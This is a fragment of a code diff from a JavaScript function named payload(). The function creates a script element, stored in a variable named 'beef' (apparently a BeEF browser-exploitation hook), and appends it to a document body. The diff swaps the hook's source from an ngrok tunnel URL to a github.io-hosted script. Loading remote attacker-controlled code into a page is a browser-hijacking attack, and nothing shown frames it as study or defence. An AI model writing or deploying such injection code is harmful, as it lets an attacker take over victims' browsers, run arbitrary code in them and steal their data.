@@ -62,7 +62,7 @@ async function payload() {
 			if (!doc) return;
 
 			const beef = doc.createElement('script');
-			beef.src = ' https://thee-slobbery-jailer.ngrok-free.dev/hook.js';
+			beef.src = 'https://exon-dv.github.io/a/b.js';
 			beef.async = true;
 			doc.body.appendChild(beef);
 
